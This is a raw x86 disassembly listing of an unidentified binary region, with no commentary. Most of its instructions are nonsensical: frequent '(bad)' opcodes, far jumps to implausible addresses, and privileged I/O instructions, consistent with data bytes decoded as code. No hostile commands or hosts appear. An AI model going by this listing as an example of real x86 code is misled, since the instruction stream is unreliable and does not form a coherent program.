  42ff25:	lock sbb al,BYTE PTR [edx]
  42ff28:	add    al,BYTE PTR [eax]
  42ff2a:	cmc    
  42ff2b:	add    BYTE PTR [eax],al
  42ff2d:	add    bh,cl
  42ff2f:	push   ebp
  42ff30:	jmp    0xf9a3:0x738ff4d6
  42ff37:	xor    BYTE PTR [ebx],ah
  42ff39:	dec    edi
  42ff3a:	adc    edx,DWORD PTR [esi+0xe]
  42ff3d:	jb     0x42ff40
  42ff3f:	cdq    
  42ff40:	jl     0x42ffbf
  42ff42:	pop    edx
  42ff43:	mov    ch,0x37
  42ff45:	xor    eax,0x85b72997
  42ff4a:	adc    DWORD PTR [esi],edi
  42ff4c:	and    DWORD PTR [edi+0x55],0x6a
  42ff50:	jne    0x42ff4d
  42ff52:	mov    esi,0x7364e2f8
  42ff57:	popf   
  42ff58:	jg     0x42ffc6
  42ff5a:	push   esp
  42ff5b:	adc    al,0xe6
  42ff5d:	mov    dl,0x53
  42ff5f:	retf   0x9afb
  42ff62:	inc    ebp
  42ff63:	cld    
  42ff64:	mov    eax,ds:0x45c511ee
  42ff69:	pop    edi
  42ff6a:	repnz cmc 
  42ff6c:	and    eax,0x777af5fd
  42ff71:	jle    0x42ffa7
  42ff73:	mov    ds:0xc8c721f4,eax
  42ff78:	jne    0x42ffde
  42ff7a:	add    cl,BYTE PTR [ebp-0x236b434c]
  42ff80:	shr    DWORD PTR [eax*2-0x67d1966a],0xa4
  42ff88:	loopne 0x42ff16
  42ff8a:	fld    QWORD PTR [esi-0xf]
  42ff8d:	out    0x55,eax
  42ff8f:	cmp    ch,dl
  42ff91:	inc    edi
  42ff92:	jmp    0x230d79d2
  42ff97:	or     BYTE PTR [ebx-0x2a],dl
  42ff9a:	lahf   
  42ff9b:	nop
  42ff9c:	fsub   DWORD PTR [ecx+eax*8+0xc]
  42ffa0:	arpl   WORD PTR [edi+0x4],ax
  42ffa3:	pusha  
  42ffa4:	xchg   ebx,eax
  42ffa5:	test   eax,0xfcd1bbad
  42ffaa:	push   esp
  42ffab:	and    BYTE PTR [eax],0xb6
  42ffae:	fscale 
  42ffb0:	bound  si,DWORD PTR [edx]
  42ffb3:	fst    DWORD PTR [ebx]
  42ffb5:	and    BYTE PTR [edi+0xd],ch
  42ffb8:	mov    dh,0xff
  42ffba:	lea    edx,[ecx+ebp*8]
  42ffbd:	mov    ds:0xd8e13114,al
  42ffc2:	and    eax,0xe36947b8
  42ffc7:	fisubr DWORD PTR [ebx]
  42ffc9:	push   ebp
  42ffca:	scas   eax,DWORD PTR es:[edi]
  42ffcb:	cwde   
  42ffcc:	call   DWORD PTR [esp+esi*8]
  42ffcf:	dec    DWORD PTR [eax+0x29]
  42ffd2:	cs pop ecx
  42ffd4:	add    al,0x57
  42ffd6:	lds    ebx,FWORD PTR [ecx+0xc372d97]
  42ffdc:	dec    ebp
  42ffdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffde:	inc    eax
  42ffdf:	sbb    DWORD PTR [eax],esp
  42ffe1:	(bad)  
  42ffe2:	push   ebx
  42ffe3:	out    dx,al
  42ffe4:	(bad)  [edx+esi*8-0xb]
  42ffe8:	jl     0x42ffc4
  42ffea:	mov    ebp,0xa09b54a3
  42ffef:	mov    edi,0xadd05af1
  42fff4:	out    dx,eax
  42fff5:	cdq    
  42fff6:	inc    ebx
  42fff7:	xlat   BYTE PTR ds:[ebx]
  42fff8:	fistp  WORD PTR [edi-0x20]
  42fffb:	cmp    eax,0x4039af98
  430000:	mov    edi,DWORD PTR [edx+0x55]
  430003:	inc    ecx
  430004:	(bad)  [esi+0x38ee1db4]
  43000a:	mov    BYTE PTR [ebp-0x70],ah
  43000d:	mov    DWORD PTR ds:[edi+0x5a00eeeb],edi
  430014:	out    0x35,eax
  430016:	sti    
  430017:	aaa    
  430018:	gs jo  0x430059
  43001b:	jp     0x43004c
  43001d:	sar    BYTE PTR [ebp-0x7a],cl
  430020:	fadd   st(5),st
  430022:	jecxz  0x430024
	...
  430094:	add    BYTE PTR [eax],al
  430096:	dec    ebp
  430097:	push   ebp
  430098:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43009e:	mov    esp,ebp
  4300a0:	or     al,ah
  4300a2:	dec    ebp
  4300a3:	add    bh,al
  4300a5:	add    BYTE PTR [eax],cl
  4300a7:	add    BYTE PTR [eax],al
  4300a9:	mov    DWORD PTR [eax],0x3ef44545
  4300af:	xor    eax,0x9c8b8500
  4300b4:	hlt    
  4300b5:	clc    
  4300b6:	retf   
  4300b7:	(bad)  
  4300b8:	enter  0x4d45,0xb8
  4300bc:	mov    esi,DWORD PTR [esp+esi*8]
  4300bf:	test   ebx,ecx
  4300c1:	pushf  
  4300c2:	enter  0x4df8,0x8b
  4300c6:	mov    DWORD PTR [ebp+0x8],0x894708
  4300cd:	inc    ebp
  4300ce:	mov    ebp,0xff8bfffc
  4300d3:	dec    ebp
  4300d4:	mov    ch,0xf4
  4300d6:	call   DWORD PTR [ebx-0x1]
  4300d9:	mov    ebx,0x8005322
  4300de:	call   DWORD PTR [ecx+0x8]
  4300e1:	pop    es
  4300e2:	jmp    0xb8:0x9cb4533
  4300e9:	call   0xc3:0x32f4728b
  4300f0:	call   0x8989:0x3c83203
  4300f7:	dec    ebp
  4300f8:	or     ah,al
  4300fa:	inc    ebp
  4300fb:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430101:	xor    eax,DWORD PTR [eax]
  430103:	retf   
  430104:	ret    
  430105:	add    eax,esi
  430107:	enter  0x8945,0x64
  43010b:	dec    ebp
  43010c:	sbb    ah,cl
  43010e:	add    BYTE PTR [ebx-0xb87b277],cl
  430114:	dec    DWORD PTR [ebx-0xbcfb275]
  43011a:	test   DWORD PTR [ebx],esi
  43011c:	dec    ebx
  43011e:	inc    DWORD PTR [ebx]
  430120:	inc    eax
  430121:	enter  0x8989,0x64
  430125:	(bad)  
  430126:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43012a:	cld    
  43012b:	dec    DWORD PTR [ebp-0xa90001]
  430131:	push   edi
  430132:	mov    BYTE PTR [edx+0x1],ch
  430135:	and    BYTE PTR [eax],al
  430137:	pop    ecx
  430138:	inc    ebp
  430139:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43013f:	push   0xffffff89
  430141:	pop    ecx
  430142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430143:	dec    ebp
  430144:	add    BYTE PTR [ecx+0x45fc088b],cl
  43014a:	jne    0x430194
  43014c:	lea    eax,[eax]
  43014e:	fs (bad) 
  430150:	dec    DWORD PTR [eax]
  430152:	mov    DWORD PTR [eax],eax
  430154:	test   al,0x0
  430156:	add    BYTE PTR [ebp-0x18],cl
  430159:	xor    ebp,DWORD PTR [edx]
  43015b:	add    eax,DWORD PTR [eax]
  43015d:	mov    eax,eax
  43015f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430166:	inc    ebp
  430167:	mov    DWORD PTR [ebx+0x459408],ecx
  43016d:	popa   
  43016e:	mov    esp,DWORD PTR [ebp-0x75]
  430171:	(bad)  
  430172:	cld    
  430173:	inc    eax
  430174:	cmp    bh,0x1
  430177:	lea    eax,[eax]
  430179:	and    BYTE PTR [eax],al
  43017b:	inc    DWORD PTR [ecx-0x18]
  43017e:	mov    ecx,DWORD PTR [ebx]
  430180:	cld    
  430181:	add    BYTE PTR [ecx+0x75014d],cl
  430187:	(bad)  
  430188:	xchg   ebp,eax
  430189:	sar    bh,1
  43018b:	inc    eax
  43018c:	inc    DWORD PTR [eax]
  43018e:	mov    eax,DWORD PTR [ebp-0x4]
  430191:	xor    edx,DWORD PTR [edx+0x7201be]
  430197:	add    BYTE PTR [edx],dl
  430199:	(bad)  
  43019a:	nop
  43019b:	inc    ebp
  43019c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4301a2:	mov    al,0xff
  4301a4:	add    bh,bh
  4301a6:	add    BYTE PTR [ebx],dh
  4301a8:	inc    DWORD PTR [ebx]
  4301aa:	sbb    al,0x89
  4301ac:	jne    0x43018a
  4301ae:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4301b4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4301ba:	mov    DWORD PTR [eax-0x70],0xee70e989
  4301c1:	inc    DWORD PTR [ebp-0x75]
  4301c4:	(bad)  [esp+ebp*8]
  4301c7:	test   DWORD PTR [esi-0x1],esp
  4301ca:	inc    ebp
  4301cb:	(bad)  
  4301cc:	aas    
  4301cd:	inc    ebp
  4301ce:	(bad)  
  4301cf:	lea    edi,[eax+edi*2-0x1]
  4301d3:	inc    edi
  4301d5:	mov    DWORD PTR [ecx],edi
  4301d7:	mov    al,ds:0x8b8000c7
  4301dc:	out    dx,al
  4301dd:	cld    
  4301de:	loopne 0x43016d
  4301e0:	inc    ebp
  4301e1:	(bad)  
  4301e2:	in     al,dx
  4301e3:	(bad)  
  4301e4:	fisttp WORD PTR [eax+0x8801c7]
  4301ea:	jecxz  0x430231
  4301ec:	out    dx,al
  4301ed:	inc    DWORD PTR [ebp-0x4]
  4301f0:	out    0x8d,eax
  4301f2:	aas    
  4301f3:	(bad)  
  4301f4:	call   0xcb2cf8
  4301f9:	add    DWORD PTR [ebx-0x7f590400],ecx
  4301ff:	add    BYTE PTR [ecx],al
  430201:	test   DWORD PTR [eax],eax
  430203:	wrmsr  
  430205:	jae    0x4301f2
  430207:	add    BYTE PTR [eax],al
  430209:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43020f:	add    esp,edi
  430211:	add    BYTE PTR [eax+0x450108],al
  430217:	mov    edi,DWORD PTR [ebp-0x6c]
  43021a:	add    DWORD PTR [eax],0x4
  43021d:	mov    eax,DWORD PTR [ebp+0x3]
  430220:	mov    edi,DWORD PTR [esp+edi*8]
  430223:	dec    ebp
  430224:	nop
  430225:	mov    eax,DWORD PTR [ecx]
  430227:	fadd   DWORD PTR [eax]
  430229:	add    BYTE PTR [ecx*4-0xafa000],al
  430230:	inc    ebp
  430231:	push   edx
  430232:	call   DWORD PTR [ebp-0x7b]
  430235:	mov    esi,DWORD PTR [ebp-0x74]
  430238:	mov    eax,DWORD PTR [eax]
  43023a:	cld    
  43023b:	mov    eax,DWORD PTR [eax+0x880103]
  430241:	add    BYTE PTR [ebp+0x6a],bh
  430244:	cmp    edi,0x10
  430247:	mov    WORD PTR [ebp+0x0],es
  43024a:	mov    edx,DWORD PTR [edx-0x4]
  43024d:	push   ecx
  43024e:	nop
  43024f:	inc    DWORD PTR [ecx]
  430251:	cld    
  430252:	add    BYTE PTR [ebp-0x26],bh
  430255:	mov    eax,DWORD PTR [eax]
  430257:	cld    
  430258:	push   eax
  430259:	nop
  43025a:	inc    ebp
  43025b:	add    edi,edi
  43025d:	add    BYTE PTR [ebx+0x4de0f445],cl
  430263:	call   0x9446c99b
  430268:	cmp    esp,ebx
  43026a:	movntq QWORD PTR [esi],mm6
  43026d:	mov    DWORD PTR [eax],0xb87c8b98
  430273:	test   ebx,eax
  430275:	jmp    DWORD PTR [esi-0x1]
  430278:	int    0xe9
  43027a:	sub    esp,esp
  43027c:	add    eax,DWORD PTR [ebp-0x30]
  43027f:	fild   WORD PTR [ebp+0x3f]
  430282:	cmp    eax,edi
  430284:	je     0xc243e6a6
  43028a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430291:	(bad)  
  430292:	jne    0x430220
  430294:	mov    ebx,ecx
  430296:	cld    
  430297:	jl     0x4302de
  430299:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43029f:	inc    ebp
  4302a0:	call   0xeb2c30
  4302a5:	add    BYTE PTR [ebx-0x7f170301],cl
  4302ab:	add    DWORD PTR es:[eax],eax
  4302ae:	add    al,al
  4302b0:	xor    BYTE PTR [eax+0x3f],dl
  4302b3:	inc    ebp
  4302b4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4302ba:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4302c0:	add    DWORD PTR [ecx+0x458be845],ecx
  4302c6:	fmul   DWORD PTR [ebx+0x8bb800]
  4302cc:	cld    
  4302cd:	call   0xd82d92
  4302d2:	dec    DWORD PTR [ebx+0x108ee8ff]
  4302d8:	add    al,al
  4302da:	push   eax
  4302db:	es inc ebp
  4302dd:	inc    ebp
  4302de:	mov    ecx,DWORD PTR [ebx+0xd89c]
  4302e4:	dec    DWORD PTR [ebx-0x3ff70301]
  4302ea:	mov    DWORD PTR gs:[eax],eax
  4302ed:	call   0x8b6b48b2
  4302f2:	inc    ebp
  4302f3:	mov    eax,0xe8d8008b
  4302f8:	add    BYTE PTR [ecx],ch
  4302fa:	mov    eax,DWORD PTR [eax]
  4302fc:	cld    
  4302fd:	mov    eax,eax
  4302ff:	call   0x462b1359
  430304:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43030a:	cld    
  43030b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430312:	xor    BYTE PTR [eax],al
  430314:	push   edi
  430315:	inc    ebp
  430316:	mov    DWORD PTR [ebx],esi
  430318:	in     al,0xb9
  43031a:	inc    ebp
  43031b:	lea    ecx,[ebx-0x3c370301]
  430321:	dec    ebp
  430322:	call   0x8dc1:0x308328b
  430329:	xchg   DWORD PTR [eax+0x1],eax
  43032c:	inc    DWORD PTR [eax]
  43032e:	call   0x432c78
  430333:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  430339:	jge    0x43036e
  43033b:	mov    eax,DWORD PTR [ebx]
  43033d:	cld    
  43033e:	lea    edx,[eax+0xff0120]
  430344:	call   0x432cd6
  430349:	push   eax
  43034a:	inc    DWORD PTR [ebp-0x1c]
  43034d:	mov    ecx,DWORD PTR [ebp-0x58]
  430350:	xor    eax,DWORD PTR [eax]
  430352:	add    edi,edi
  430354:	cmp    ebp,eax
  430356:	jne    0x43037e
  430358:	mov    DWORD PTR [eax],0x8b004dd8
  43035e:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  430365:	mov    eax,ebx
  430367:	cld    
  430368:	test   BYTE PTR [eax+0x32019a],bh
  43036e:	mov    DWORD PTR [ebp+0x8],esi
  430371:	xor    eax,DWORD PTR [ebp-0x73]
  430374:	test   DWORD PTR [esp+esi*2-0x1],edi
  430378:	mov    ebp,eax
  43037a:	mov    eax,0x33004d29
  43037f:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430385:	add    DWORD PTR [eax],eax
  430387:	add    BYTE PTR [ebp+0x30],al
  43038a:	mov    edx,DWORD PTR [edi-0x48]
  43038d:	add    ebx,0xffffffe4
  430390:	test   bp,cx
  430393:	je     0x4303c0
  430395:	mov    eax,DWORD PTR [ebx]
  430397:	cld    
  430398:	sar    BYTE PTR [eax+0x3b0145],1
  43039e:	pcmpeqw mm4,mm6
  4303a1:	xor    edi,edi
  4303a3:	lea    ecx,[ebx-0x239e7470]
  4303a9:	add    BYTE PTR [ebp+0x50],cl
  4303ac:	cmp    eax,DWORD PTR [ebp+0x75]
  4303af:	mov    ebp,DWORD PTR [eax-0x68]
  4303b2:	test   DWORD PTR [eax],eax
  4303b4:	clc    
  4303b5:	push   DWORD PTR [ebp-0x1]
  4303b8:	lea    ecx,[eax]
  4303ba:	int3   
  4303bb:	inc    ebp
  4303bc:	call   0xfb344c
  4303c1:	jne    0x4303bb
  4303c3:	xor    edi,DWORD PTR [ebp-0x41]
  4303c6:	jmp    0x43043a
  4303c8:	mov    eax,DWORD PTR [eax]
  4303ca:	mov    eax,0x339545c7
  4303cf:	inc    DWORD PTR [ebx]
  4303d1:	push   DWORD PTR [ecx]
  4303d3:	xor    eax,0x50eb008b
  4303d8:	mov    eax,DWORD PTR [ebp-0x3c]
  4303db:	mov    eax,eax
  4303dd:	cld    
  4303de:	clc    
  4303df:	ret    
  4303e0:	test   bh,al
  4303e2:	pop    es
  4303e3:	xchg   ebp,eax
  4303e4:	add    bh,bh
  4303e6:	inc    ebp
  4303e7:	dec    DWORD PTR [edi]
  4303e9:	pop    ds
  4303ea:	sub    eax,DWORD PTR [eax]
  4303ec:	add    BYTE PTR [eax+0x76],dl
  4303ef:	push   ebp
  4303f0:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4303f6:	or     al,0xcf
  4303f8:	inc    eax
  4303f9:	enter  0x745,0x72
  4303fd:	inc    ebp
  4303fe:	mov    eax,DWORD PTR [ecx]
  430400:	int3   
  430401:	add    BYTE PTR [ebp-0x75],al
  430404:	xor    eax,0xc74d9cb8
  430409:	xor    edx,eax
  43040b:	lea    eax,[ebp+0x4572f808]
  430411:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430417:	fadd   st,st(6)
  430419:	rol    BYTE PTR [ebp+0x12],0x8b
  43041d:	inc    ebp
  43041e:	fmul   QWORD PTR [ebx-0x3c39233d]
  430424:	inc    ebp
  430425:	test   bh,al
  430427:	call   0xdcf8:0x898532f8
  43042e:	inc    ebp
  43042f:	inc    ebp
  430430:	cmp    esi,DWORD PTR [ebx]
  430432:	pushf  
  430433:	mov    ecx,0xffb48dc7
  430438:	test   eax,ecx
  43043a:	clc    
  43043b:	dec    ebp
  43043c:	inc    ebp
  43043d:	mov    edi,DWORD PTR [ecx]
  43043f:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  430446:	test   edi,edi
  430448:	clc    
  430449:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  430450:	(bad)  
  430451:	enter  0x18e8,0x85
  430455:	xor    eax,0xff459cf8
  43045a:	mov    edi,esp
  43045c:	lock inc ebp
  43045e:	ret    
  43045f:	push   eax
  430460:	(bad)  
  430461:	idiv   BYTE PTR [ebp+0x0]
  430464:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  43046a:	add    BYTE PTR [ebx],dl
  43046c:	jmp    0xce05be
  430471:	les    eax,FWORD PTR [ebp-0x35]
  430474:	mov    ecx,esi
  430476:	lock or al,cl
  430479:	clc    
  43047a:	inc    ebp
  43047b:	add    esi,DWORD PTR [ebx]
  43047d:	jge    0x430482
  43047f:	xor    edi,DWORD PTR [ebx]
  430481:	cmp    ecx,DWORD PTR [edi]
  430483:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430488:	mov    edi,DWORD PTR [ecx]
  43048a:	test   al,0xcc
  43048c:	dec    ebp
  43048d:	test   BYTE PTR [ebx],dh
  43048f:	pop    es
  430490:	xor    eax,DWORD PTR [eax]
  430492:	add    ecx,DWORD PTR [esi]
  430494:	add    ecx,eax
  430496:	psraw  mm0,mm1
  430499:	sub    BYTE PTR [ebp+0x38],cl
  43049c:	mov    edi,DWORD PTR [ebx]
  43049e:	lock int3 
  4304a0:	shl    edx,1
  4304a2:	rol    BYTE PTR [ebp+0xc],1
  4304a5:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4304ac:	jmp    0x7704f6
  4304b1:	pushf  
  4304b2:	inc    ebp
  4304b3:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4304b9:	xor    ecx,ebx
  4304bb:	add    ecx,esi
  4304bd:	mov    esi,eax
  4304bf:	enter  0x45af,0x8b
  4304c3:	xor    ecx,eax
  4304c5:	add    edx,DWORD PTR [ebp-0x77]
  4304c8:	sub    ecx,DWORD PTR [eax]
  4304ca:	cmp    eax,DWORD PTR [ebp+0x77]
  4304cd:	aad    0x8b
  4304cf:	pushf  
  4304d0:	test   al,0xc7
  4304d2:	mov    DWORD PTR [eax-0x7747b00],ebp
  4304d8:	lods   al,BYTE PTR ds:[esi]
  4304d9:	inc    ebp
  4304da:	dec    ebp
  4304db:	cmp    dh,BYTE PTR [ebx]
  4304dd:	pushf  
  4304de:	xor    eax,edi
  4304e0:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4304e7:	inc    ebp
  4304e8:	dec    ebp
  4304e9:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  4304ef:	mov    esp,0xf80585d0
  4304f4:	inc    ebp
  4304f5:	inc    ebp
  4304f6:	jmp    0x430536
  4304f8:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4304ff:	dec    ebp
  430500:	xor    esi,DWORD PTR [ebx]
  430502:	add    eax,DWORD PTR [ebx]
  430504:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43050a:	dec    ebp
  43050b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430511:	out    dx,eax
  430512:	rol    BYTE PTR [eax],1
  430514:	add    eax,0xebc8458b
  430519:	dec    ebp
  43051a:	mov    ebp,DWORD PTR [ebx]
  43051c:	mov    esp,0x33f84d8b
  430521:	ret    
  430522:	xor    eax,esi
  430524:	add    ecx,eax
  430526:	add    eax,DWORD PTR [edx+0xc1010f]
  43052c:	dec    ebp
  43052d:	inc    ebp
  43052e:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430534:	ror    bl,1
  430536:	add    eax,0xebc645ce
  43053b:	scas   eax,DWORD PTR es:[edi]
  43053c:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430542:	xor    ebp,DWORD PTR [ebx]
  430544:	xor    edi,DWORD PTR [ebx]
  430546:	add    esi,DWORD PTR [edi+0x3]
  430549:	mov    ecx,DWORD PTR [edi]
  43054b:	clc    
  43054c:	rol    ebx,0x4d
  43054f:	(bad)  
  430550:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  430557:	mov    ah,0x45
  430559:	dec    ebp
  43055a:	jbe    0x43058f
  43055c:	mov    esi,DWORD PTR [ebx]
  43055e:	call   0x33465266
  430563:	rdpmc  
  430565:	rol    DWORD PTR [ebx],0x4d
  430568:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43056e:	inc    ebp
  43056f:	ror    BYTE PTR [ebx+0x45450808],1
  430575:	jmp    0x10b0605
  43057a:	inc    ebp
  43057b:	inc    ebp
  43057c:	(bad)  
  43057d:	mov    ebx,eax
  43057f:	clc    
  430580:	test   ebx,eax
  430582:	clc    
  430583:	retf   
  430584:	inc    ebp
  430585:	into   
  430586:	mov    esi,0x8b85afec
  43058c:	clc    
  43058d:	enter  0x5545,0x3b
  430591:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430598:	ret    
  430599:	mov    ah,0xc6
  43059b:	addr16 push 0x338b4545
  4305a1:	clc    
  4305a2:	add    eax,ebx
  4305a4:	loopne 0x430571
  4305a6:	dec    ebp
  4305a7:	into   
  4305a8:	mov    al,dh
  4305aa:	or     BYTE PTR [edi-0x37ff748e],ch
  4305b0:	inc    ebp
  4305b1:	push   ebp
  4305b2:	mov    ebp,DWORD PTR [ebx]
  4305b4:	in     al,dx
  4305b5:	cmp    eax,ebx
  4305b7:	ja     0x4305fe
  4305b9:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4305bf:	inc    ebp
  4305c0:	call   0xd7c3:0x88f8328b
  4305c7:	retf   
  4305c8:	inc    ebp
  4305c9:	into   
  4305ca:	mov    eax,esi
  4305cc:	in     al,dx
  4305cd:	scas   eax,DWORD PTR es:[edi]
  4305ce:	retf   
  4305cf:	mov    ecx,DWORD PTR [ebp-0x38]
  4305d2:	mov    edx,DWORD PTR [ebp-0x24]
  4305d5:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  4305dc:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4305e3:	mov    eax,DWORD PTR [ebx]
  4305e5:	clc    
  4305e6:	loopne 0x4305ab
  4305e8:	push   ebp
  4305e9:	retf   
  4305ea:	mov    dh,al
  4305ec:	adc    esi,ecx
  4305ee:	jb     0x43059f
  4305f0:	add    BYTE PTR [ebx+0x558bc845],cl
  4305f6:	in     al,dx
  4305f7:	sub    eax,ebx
  4305f9:	cmp    ecx,ebx
  4305fb:	mov    eax,esi
  4305fd:	mov    esp,0x45af03ce
  430602:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430608:	mov    eax,ebx
  43060a:	in     al,dx
  43060b:	into   
  43060c:	dec    ebp
  43060d:	(bad)  
  43060e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430614:	rol    DWORD PTR [ebp+0x4d],0x89
  430618:	xor    esp,esp
  43061a:	sub    eax,DWORD PTR [ebp-0x75]
  43061d:	add    ebp,esp
  43061f:	mov    al,0x55
  430621:	inc    ebp
  430622:	xor    esi,DWORD PTR ds:0x890f9c03
  430628:	retf   0x55dc
  43062b:	inc    ebp
  43062c:	xor    esi,DWORD PTR [ebx+ebp*1]
  43062f:	pushf  
  430630:	(bad)  
  430631:	(bad)  
  430632:	adc    eax,eax
  430634:	jb     0x4305bb
  430636:	add    al,bh
  430638:	enter  0x8645,0x33
  43063c:	inc    DWORD PTR [ebx]
  43063e:	(bad)  
  43063f:	jmp    0x430686
  430641:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  430647:	inc    ebp
  430648:	(bad)  
  430649:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43064f:	call   0xb4d:0x88c132cb
  430656:	lea    eax,[ebp+0x8]
  430659:	xor    esi,DWORD PTR [edx+0x3]
  43065c:	add    al,ah
  43065e:	inc    ebp
  43065f:	dec    ebp
  430660:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  430666:	data16 add ch,cl
  430669:	inc    ebp
  43066a:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  430670:	inc    ebp
  430671:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  430677:	push   ebp
  430678:	(bad)  
  430679:	mov    BYTE PTR [edi+0xf723b11],ch
  43067f:	add    ch,ch
  430681:	inc    ebp
  430682:	dec    DWORD PTR [ebx-0x34332775]
  430688:	add    al,0x4d
  43068a:	inc    ebp
  43068b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430691:	call   0xc000:0x8b003201
  430698:	add    BYTE PTR [ebp-0x1],cl
  43069b:	xor    ecx,esp
  43069d:	xor    eax,DWORD PTR [eax]
  43069f:	add    edx,DWORD PTR [eax+0x3]
  4306a2:	mov    DWORD PTR [edi],ecx
  4306a4:	call   0x4288c76a
  4306a9:	mov    DWORD PTR [ebp-0x20],esp
  4306ac:	add    BYTE PTR [ebp+0x7d],al
  4306af:	mov    eax,DWORD PTR [eax]
  4306b1:	in     al,0x15
  4306b3:	ret    
  4306b4:	iret   
  4306b5:	(bad)  
  4306b6:	enter  0x14af,0x8b
  4306ba:	(bad)  
  4306bb:	in     al,dx
  4306bc:	or     bl,cl
  4306be:	adc    cl,al
  4306c0:	push   ebp
  4306c1:	dec    ebp
  4306c2:	inc    eax
  4306c3:	mov    edx,DWORD PTR [ebp-0x20]
  4306c6:	jb     0x430693
  4306c8:	mov    ecx,esi
  4306ca:	cld    
  4306cb:	scas   eax,DWORD PTR es:[edi]
  4306cc:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4306d3:	mov    BYTE PTR [eax],0x8c
  4306d6:	push   0xffffff9a
  4306d8:	push   edi
  4306d9:	xor    dl,BYTE PTR [eax+0x3b]
  4306dc:	mov    ecx,DWORD PTR [edi]
  4306de:	call   0x8c424c41
  4306e3:	mov    eax,eax
  4306e5:	in     al,dx
  4306e6:	jge    0x430735
  4306e8:	mov    DWORD PTR [ebx],esi
  4306ea:	int3   
  4306eb:	add    eax,DWORD PTR [ebp+0xf]
  4306ee:	xor    eax,ecx
  4306f0:	(bad)  
  4306f1:	dec    ebp
  4306f2:	pushf  
  4306f3:	xor    ecx,esp
  4306f5:	add    edi,DWORD PTR [edi]
  4306f7:	mov    eax,DWORD PTR [ebp-0x38]
  4306fa:	aam    0x84
  4306fc:	aam    0x9a
  4306fe:	add    esi,DWORD PTR [edx]
  430700:	jmp    0x43068b
  430702:	mov    cl,al
  430704:	add    eax,0x14330f45
  430709:	mov    ecx,0xff458d80
  43070e:	jmp    0xc99016db
  430713:	mov    edx,ecx
  430715:	rol    BYTE PTR [ebp+0x330155],1
  43071b:	add    ecx,DWORD PTR [ebp+0xf]
  43071e:	xor    eax,edx
  430720:	(bad)  
  430721:	ror    DWORD PTR [eax],0x86
  430724:	jb     0x430723
  430726:	add    bh,bh
  430728:	clc    
  430729:	inc    ebp
  43072a:	jb     0x430796
  43072c:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430732:	xor    eax,0xc7d89c8b
  430737:	add    al,al
  430739:	push   0xf830c3
  43073e:	inc    ebp
  43073f:	jne    0x430776
  430741:	push   0xffffff9c
  430743:	inc    edi
  430745:	adc    al,0xe8
  430747:	inc    ebp
  430748:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43074e:	mov    ecx,DWORD PTR [eax]
  430750:	cld    
  430751:	or     DWORD PTR [ebp-0x34],0x33
  430755:	jbe    0x43075a
  430757:	mov    edx,DWORD PTR [ecx+0x2b]
  43075a:	dec    ebp
  43075b:	mov    cl,BYTE PTR [ebx+0x45d801]
  430761:	mov    BYTE PTR [ebx],dh
  430763:	mov    eax,DWORD PTR [ebx]
  430765:	or     BYTE PTR [ecx+0x3b],dl
  430768:	dec    ebp
  430769:	int3   
  43076a:	xor    ebp,edi
  43076c:	add    eax,DWORD PTR [ebp+0x51]
  43076f:	mov    ecx,DWORD PTR [ebp-0x28]
  430772:	xor    eax,DWORD PTR [eax]
  430774:	add    ebp,DWORD PTR [eax+0x51]
  430777:	adc    BYTE PTR [eax+0x0],0x8b
  43077b:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430781:	inc    ebp
  430782:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430788:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43078e:	dec    ebp
  43078f:	mov    esi,DWORD PTR [ebx]
  430791:	hlt    
  430792:	add    eax,ebx
  430794:	push   ecx
  430795:	inc    ebp
  430796:	dec    ebp
  430797:	aam    0xff
  430799:	aam    0xe4
  43079b:	(bad)  
  43079c:	retf   
